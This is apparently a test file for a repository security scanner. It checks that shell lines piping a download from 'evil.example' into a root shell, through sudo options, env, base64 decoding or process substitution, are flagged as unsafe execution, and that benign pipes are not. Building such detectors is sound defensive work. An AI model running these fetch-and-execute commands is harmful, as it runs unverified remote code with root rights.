import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

/**
 * PRD section 8: `sudo` options such as `-E`, `-H` or `-u root`, and `env`
 * assignments, still run the command that follows. `curl … | sudo -E bash -`
 * is the widespread NodeSource installer form and executes the download
 * exactly as `curl … | sudo bash` does.
 */
function findings(body: string) {
  return inspectRepository({
    files: [
      {
        path: "scripts/bootstrap.sh",
        bytes: new TextEncoder().encode(`${body}\n`),
      },
    ],
  }).findings.map(
    (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
  );
}

test("a download run through sudo options or env assignments is unsafe execution", () => {
  for (const body of [
    "curl -fsSL https://evil.example/setup.x | sudo -E bash -",
    "curl -fsSL https://evil.example/i.sh | sudo -H bash",
    "curl -fsSL https://evil.example/i.sh | sudo -EH sh",
    "curl -fsSL https://evil.example/i.sh | sudo -u root bash",
    "curl -fsSL https://evil.example/i.sh | sudo --preserve-env=PATH,HOME bash",
    "curl -fsSL https://evil.example/i.sh | sudo -- bash",
    "curl -fsSL https://evil.example/i.sh | env FOO=1 bash",
    "curl -fsSL https://evil.example/i.sh | env -i bash",
    "curl -fsSL https://evil.example/i.sh | sudo -E env DEBIAN_FRONTEND=noninteractive bash",
    "curl -fsSL https://evil.example/i.py | sudo -E python3 -",
    "sudo -E bash <(curl -fsSL https://evil.example/i.sh)",
    "curl -fsSL https://evil.example/i.b64 | base64 -d | sudo -n sh",
  ])
    expect({ body, findings: findings(body) }).toEqual({
      body,
      findings: ["scripts/bootstrap.sh:unsafe-execution:high"],
    });
});

test("sudo or env before a non-executing command, or a different sudo mode, keeps no finding", () => {
  for (const body of [
    "curl -fsSL https://example.com/key.gpg | sudo -E gpg --dearmor -o /usr/share/keyrings/x.gpg",
    "curl -fsSL https://example.com/list | sudo -u root tee /etc/apt/sources.list.d/x.list",
    "curl -fsSL https://example.com/dump.sql | sudo -u postgres psql",
    "curl -fsSL https://example.com/data | env FOO=1 jq .",
    // `-u` takes `bash` as the user name; no command follows.
    "curl -fsSL https://example.com/data | sudo -u bash",
    // `-l` lists privileges instead of running the command.
    "curl -fsSL https://example.com/data | sudo -l bash",
  ])
    expect({ body, findings: findings(body) }).toEqual({ body, findings: [] });
});
